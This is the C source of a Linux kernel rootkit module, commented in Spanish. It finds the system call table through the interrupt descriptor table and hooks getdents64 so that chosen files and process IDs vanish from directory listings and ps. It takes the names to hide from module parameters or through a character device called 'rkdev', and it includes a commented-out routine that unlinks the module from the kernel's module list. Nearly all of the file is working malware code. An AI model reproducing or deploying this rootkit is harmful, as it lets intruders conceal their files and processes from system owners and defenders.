#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
//#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/ioctl.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#define TAM 100
#define N 10
#define IOCTL_SET_MSG _IOR(DEV_NUM, 0, char *)
#define IOCTL_GET_MSG _IOR(DEV_NUM, 1, char *)
#define IOCTL_GET_NTH_BYTE _IOWR(DEV_NUM, 2, int)
#define SUCCESS 0
#define DEVICE_NAME "rkdev"
#define TAM_DAT 500
/******************************************************************************************/
/*******************  DECLARACION DE PROTOTIPOS Y VARIABLES  ******************************/
/******************************************************************************************/
asmlinkage long (*getdents64_original)(unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage long getdents64_modificada(unsigned int fd, struct dirent64 *dirp, unsigned int count);
int device_ioctl(struct inode *inode, struct file *file, unsigned int ioctl_num, unsigned long ioctl_param);
static ssize_t device_write(struct file *file,const char __user * buffer, size_t length, loff_t * offset);
static ssize_t device_read(struct file *file, char __user * buffer,size_t length,loff_t * offset);
static int device_release(struct inode *inode, struct file *file);
static int device_open(struct inode *inode, struct file *file);
void *get_system_call(void);
void *get_sys_call_table(void *system_call);
void separa(char *cadena);
void recibe_echo(char *echo);
/*----------------------------------------------------------------------------------------*/
void **sys_call_table;
char tmpocultar[TAM],pidocultar[TAM],**hidedev;
static char *procs[N]; 
static char *fs[N];
static char *nets[N];
static char *mods[N];
static int arr_procs = 0;
static int arr_fs = 0;
static int arr_nets = 0;
static int arr_mods = 0;
unsigned long dire_exit, after_call;
unsigned long dire_call;
static int Device_Open = 0;
static char Message[TAM_DAT];
static char *Message_Ptr;
int flag_dev,cont=0;
/*----------------------------------------------------------------------------------------*/
struct idt_descriptor
{
	unsigned short off_low;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off_high;
};
struct file_operations Fops = {
	.read = device_read,
	.write = device_write,
	.ioctl = device_ioctl,
	.open = device_open,
	.release = device_release,
};
/******************************************************************************************/
/*************************   MODULOS DE INIT Y CLEANUP    *********************************/
/******************************************************************************************/
int init_module(void)
{
	void *s_call;
	int ret_val;

/*	#if HIDEMOD == 1
		struct module *m = &__this_module;		// Se obtiene la direccion de este modulo 	
								// Se borra de la lista de modulos 		
		if (m->init == init_module)
			list_del(&m->list);
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,7)
			kobject_unregister(&m->mkobj.kobj);
		#endif
	#endif
*/
	s_call = get_system_call();				/* Se obtiene la direccion de la sys_call_table */
	sys_call_table = get_sys_call_table(s_call);
						   		/* Se obtienen las direcciones de las syscalls	*/	
								/* originales 					*/
	getdents64_original = sys_call_table[__NR_getdents64]; 	
	sys_call_table[__NR_getdents64]=getdents64_modificada;

	ret_val = register_chrdev(DEV_NUM, DEVICE_NAME, &Fops);
	if (ret_val < 0) {
		printk("ERROR: No se pudo registrar el dispositivo");
		return ret_val;
	}

	hidedev = (char **) kmalloc(sizeof(char*)*TAM, 0);	
	for(cont=0;cont<arr_fs;cont++)
	{
		hidedev[cont]=fs[cont];		
	}	
	#if MODO == 1
		printk("******************************************************\n");
		printk("MODULO INSTALADO\n");
	#endif
	return(0);
}
/*----------------------------------------------------------------------------------------*/
void cleanup_module(void)
{
	int ret;
	sys_call_table[__NR_getdents64]=getdents64_original;
	ret = unregister_chrdev(DEV_NUM, DEVICE_NAME);
	if (ret < 0)
		printk("Error in module_unregister_chrdev: %d\n", ret);
	printk("MODULO DESINSTALADO\n");
}
/******************************************************************************************/
/**************************   F  U  N  C  I  O  N  E  S   *********************************/
/******************************************************************************************/
asmlinkage long getdents64_modificada(unsigned int fd, struct dirent64 *dirp, unsigned int count)
{
	struct dirent64 *td1, *td2;
	long ret, tmp;
	unsigned long hpid=0, nwarm,hpid2=0;
	short int mover_puntero, ocultar_proceso;
	int i=0,j,k=0;
									/* Se llama a la syscall original para 		*/
									/* hacer la maipulacion intermedia de 		*/
									/* los datos					*/
	ret = (*getdents64_original) (fd, dirp, count);
									/* Se evalua si vale cero. Retorna el		*/
									/* si vale cero					*/
	if (!ret)
		return(ret);
									/* Como se sabe, se debe copiar la lista  	*/
									/* obtenida por getdents64, hacia el 		*/
									/* ESPACIO DEL KERNEL				*/
	td2 = (struct dirent64 *) kmalloc(ret, GFP_KERNEL);
	__copy_from_user(td2, dirp, ret);
									/* Se inicia el ciclo en donde se manipu- 	*/
									/* lan los archivos y procesos a ocultar	*/
	while(i<cont || k<arr_procs)
	{
		
		for(j=0;j<TAM;j++){					/* Se limpian los arreglos temporales que 	*/
			tmpocultar[j]='\0';				/* contendran los archivos y procesos a		*/
			pidocultar[j]='\0';				/* ocultar					*/
		}
		if (i>= cont || cont==0)				/* Evaluamos el numero de parametros que	*/
			strcpy(tmpocultar,"");				/* se ingresaron con un contador para 		*/
		else							/* saber que valor del arreglo  de los		*/
			strcpy(tmpocultar,hidedev[i]);			/* parametros se pasara. Si ya se  eva-		*/
		if (k>=arr_procs || arr_procs==0)			/* luaron todos los de procs, y aun falta 	*/
			strcpy(pidocultar,"");				/* valores de fs por evaluar, se pone a 	*/
		else							/* cadena vacia para que no 'esconda' mas  	*/
			strcpy(pidocultar,procs[i]);			/* procs y viceversa.				*/
		#if MODO == 1					
		printk("OCULTANDO ARCHIVO: -%s-\n",tmpocultar); 	/* Si esta em modo DEBUG, imprime 		*/
		printk("OCULTANDO PROCESO: -%s-\n",pidocultar); 	/* en /var/log/messages lo que se 		*/
		#endif							/* esta ocultando				*/
		i++;							/* Se incrementan los contadores		*/
 		k++;
		td1 = td2, tmp = ret;					/* Se pasa la lista a varibales temporales	*/
		hpid2 = simple_strtoul(pidocultar, NULL, 10);		/* Se tranforma a unsigned long el  		*/
									/* valor del PID a ocultar, esto es 		*/
									/* porque se recibe como una cadena 		*/
		while (tmp > 0)						/* Se inicia el ciclo donde se hacen las  	*/
		{							/* comparaciones de las cadenas a ocultar 	*/
			tmp -= td1->d_reclen;				/* En cada iteracion se va disminuyendo la	*/
			mover_puntero = 1;				/* lista hasta haber recorrido todos los  	*/
			ocultar_proceso = 0;				/* elementos obtenidos por getdents		*/
			hpid = 0;					/* Debido a que el comando 'ps' se basa en	*/
									/* la lectura de /proc, el PID a ocultar  	*/
									/* se toma como un archivo de dicho direc-	*/
									/* torio, por lo cual igualmente se maneja	*/
									/* el campo d_name de la estructura para  	*/
									/* hacer la comparacion				*/
			hpid = simple_strtoul(td1->d_name, NULL, 10);
									/* Inicia ciclo de Procesos a ocultar		*/
			if (hpid != 0)
			{
				struct task_struct *htask = current;						
				do{					/* Se va recorriendo la lista			*/
					if(htask->pid == hpid)		/* de procesos hasta encontrar			*/
						break;			/* el PID a ocultar				*/
					else
						htask = next_task(htask);
				}while (htask != current);
				#if MODO == 1				/* Una vez localizados en la lista, 		*/
				printk("hpid2: -%ld-\n",hpid2);		/* si esta en modo DEBUG se imprime 		*/
							 			/* los procesos a ocultar		*/
				#endif
										/* Se hace el 'salto' en la lista 	*/
										/* Para que pase dicho proceso y	*/
										/* vaya al siguiente			*/
				if (((htask->pid == hpid) && (htask->pid == hpid2)) ||
				((htask->pid == hpid) && (strcmp(htask->comm, tmpocultar) == 0)))
					ocultar_proceso = 1;
        		}
										/* Inicia la comparacion del archivo	*/
										/* a ocultar con el valor actual de 	*/
										/* d_name, el cual es el campo con  	*/
										/* los nombres de los archivos de la	*/
										/* lista obtenida con getdents64	*/
			if ((ocultar_proceso) || (strcmp(td1->d_name, tmpocultar) == 0))
			{
										/* Si coicide, se 'borra' la entrada	*/
				ret -= td1->d_reclen;								
				mover_puntero = 0;				/* Se recorre apuntador al siguiente 	*/
				if (tmp)					/* Verifica si ya llego al utimo	*/
					memmove(td1, (char *) td1 + td1->d_reclen, tmp);
			}
			if ((tmp) && (mover_puntero))				/* Se mueve el apuntador a la dir	*/
										/* original				*/
				td1 = (struct dirent64 *) ((char *) td1 + td1->d_reclen);
		} 
	}
									/* Una vez manipulada la lista, se regresa	*/
									/* al ESPACIO DE USUARIO 	 		*/
	nwarm = __copy_to_user((void *) dirp, (void *) td2, ret);
	kfree(td2);							/* Se liberan los apuntadores			*/
	return(ret);
}
/*----------------------------------------------------------------------------------------*/
void *get_system_call(void)
{
	unsigned char idtr[6];
	unsigned long base;
	struct idt_descriptor desc;
	asm ("sidt %0" : "=m" (idtr));
	base = *((unsigned long *) &idtr[2]);
	memcpy(&desc, (void *) (base + (0x80*8)), sizeof(desc));
	return((void *) ((desc.off_high << 16) + desc.off_low)); 
}
/*----------------------------------------------------------------------------------------*/
/* 	Funcion basada en tecnica de www.enye-sec.org	*/
/* 	El metodo que utiliza esta funcion se basa en la obtencion del handler de la int80. Para esto 	*/
/* 	compara*/
void *get_sys_call_table(void *system_call)
{
	unsigned char *apuntador_aux;
	unsigned long s_c_t;
	apuntador_aux = (unsigned char *) system_call;
	while (!((*apuntador_aux == 0xff) && (*(apuntador_aux+1) == 0x14) && (*(apuntador_aux+2) == 0x85)))
		apuntador_aux++;
	dire_call = (unsigned long) apuntador_aux;
	apuntador_aux += 3;
	s_c_t = *((unsigned long *) apuntador_aux);
	apuntador_aux += 4;
	after_call = (unsigned long) apuntador_aux;
	while (*apuntador_aux != 0xfa)
		apuntador_aux++;
	dire_exit = (unsigned long) apuntador_aux;
	return((void *) s_c_t);
}
/*----------------------------------------------------------------------------------------*/
static int device_open(struct inode *inode, struct file *file)
{
	if (Device_Open)
		return -EBUSY;
	Device_Open++;
	Message_Ptr = Message;
	try_module_get(THIS_MODULE);
	return SUCCESS;
}
/*----------------------------------------------------------------------------------------*/
static int device_release(struct inode *inode, struct file *file)
{
	Device_Open--;
	module_put(THIS_MODULE);
	return SUCCESS;
}
/*----------------------------------------------------------------------------------------*/
static ssize_t device_read(struct file *file, char __user * buffer,size_t length,loff_t * offset)
{
	int bytes_read = 0;
	if (*Message_Ptr == 0)
		return 0;
	while (length && *Message_Ptr) {
		put_user(*(Message_Ptr++), buffer++);
		length--;
		bytes_read++;
	}
	return bytes_read;
}
/*----------------------------------------------------------------------------------------*/
static ssize_t device_write(struct file *file,const char __user * buffer, size_t length, loff_t * offset)
{
	int i;
	for (i = 0; i < length && i < TAM_DAT; i++)
		get_user(Message[i], buffer + i);

	Message_Ptr = Message;
	printk(KERN_INFO "Cadena recibida por el dispositivo: %s\n", Message);	/* Es aqui donde se llama a la funcion	*/
	recibe_echo(Message);							/* que procesara la cadena recibida por	*/
	memset(Message,'\0',TAM_DAT);						/* el dispositivo.			*/
	return i;
}
/*----------------------------------------------------------------------------------------*/
int device_ioctl(struct inode *inode, struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
{
	int i;
	char *temp;
	char ch;
	switch (ioctl_num) {
	case IOCTL_SET_MSG:
		temp = (char *)ioctl_param;
		get_user(ch, temp);
		for (i = 0; ch && i < TAM_DAT; i++, temp++)
			get_user(ch, temp);
		device_write(file, (char *)ioctl_param, i, 0);
		break;
	case IOCTL_GET_MSG:
		i = device_read(file, (char *)ioctl_param, 99, 0);
		put_user('\0', (char *)ioctl_param + i);
		break;
	case IOCTL_GET_NTH_BYTE:
		return Message[ioctl_param];
		break;
	}
	return SUCCESS;
}
/*----------------------------------------------------------------------------------------*/
void recibe_echo(char *echo)					/* Esta funcion se encarga de recibir y procesar la 	*/
{								/* cadena que recibe el dispositivo /dev/xxx.		*/
   	char *cadena1 = echo,cad1[TAM],cad2[TAM],tmp[TAM];	/* Corta las cadenas obteniendo solo la lista de ele-	*/
   	const char *cadena2 = "=";				/* mentos separados por comas, y al final concatena	*/
	int i=0,j=0,ban=1;					/* dichas listas para llamar a la funcion que los 	*/
	memset(cad1,'\0',TAM);					/* separa uno por uno y los va metiendo a la memoria	*/
	memset(cad2,'\0',TAM);					/* en el arreglo de la lista a elementos a ocultar	*/
	memset(tmp,'\0',TAM);
	printk("DEV--: [%s]\n",cadena1);
	while(cadena1[i] != ' '){
		if(cadena1[i] == '\0'){
			ban=0;
			break;
		}
		cad1[j]=cadena1[i];
		i++;
		j++;
	}
	if(ban!=0){
		j=0;
		while(cadena1[i] != '\0'){
			cad2[j]=cadena1[i];
			i++;
			j++;
		}
	}
	else{
		printk("i cad:  %d",i);
		cad1[i-1]='\0';
		strcpy(cad2,"fs=");
	}
	printk("CAD1: %s\n",cad1);
	printk("CAD2: %s\n",cad2);
	sprintf(tmp,"%s",strstr(cad1,cadena2));
	printk("CAD1(tmp): %s -> %d\n",tmp,strlen(tmp));
	for(i=1,j=0;i<strlen(tmp);i++,j++)
		tmp[j]=tmp[i];
	tmp[j]='\0';
	memset(cad1,'\0',TAM);
	strcpy(cad1,tmp);
	memset(tmp,'\0',TAM);	
	sprintf(tmp,"%s",strstr(cad2,cadena2));
	printk("CAD2(tmp): %s -> %d\n",tmp,strlen(tmp));
	for(i=1,j=0;i<strlen(tmp)-1;i++,j++)
		tmp[j]=tmp[i];
	tmp[j]='\0';
	memset(cad2,'\0',TAM);
	strcpy(cad2,tmp);
	printk("CAD1: %s\n",cad1);
	printk("CAD2: %s\n",cad2);
	strcat(cad1,",");
	strcat(cad1,cad2);
	printk("CAD FIN: %s\n",cad1);
	separa(cad1);
}
/*----------------------------------------------------------------------------------------*/
void separa(char cadena[])				/* Esta funcion de encarga de separar cada elemento de	*/
{							/* la lista introducida con el echo al dispositivo.	*/
	int i=0,j=0,k=0;				/* Tambien agrega al arreglo de elementos a ocultar	*/
	char token[TAM],*tmp; 				/* a los elementos queva separando			*/
	cadena[strlen(cadena)]='\0';
   	printk( "Argumentos recibidos de dispositivo:\n [%s] \n", cadena);
	while(cadena[i] != '\0'){
		memset(token,'\0',TAM);
	   	while ( cadena[i] != ',' ) {
      		token[j]=cadena[i];
			i++;
			j++;
			if (cadena[i] == '\0')
				break;
   		}
		printk("DEV %d: %s -- [%d] \n",cont,token,strlen(token));
		tmp=(char *)kmalloc(sizeof(char)*TAM,0);
		memset(tmp,'\0',TAM);
		for(k=0;k<strlen(token);k++)
			*(tmp+k)=token[k];
		printk("%s se guarda en hidedev[%d]\n",tmp,cont);
		hidedev[cont]=tmp;
		j=0;
		i++;
		cont++;
	}
	flag_dev=1;
}
/*----------------------------------------------------------------------------------------*/
module_param_array(procs, charp, &arr_procs, 0000);		/* Parametros que recibe el modulo		*/
module_param_array(fs, charp, &arr_fs, 0000);
module_param_array(nets, charp, &arr_nets, 0000);
module_param_array(mods, charp, &arr_mods, 0000);
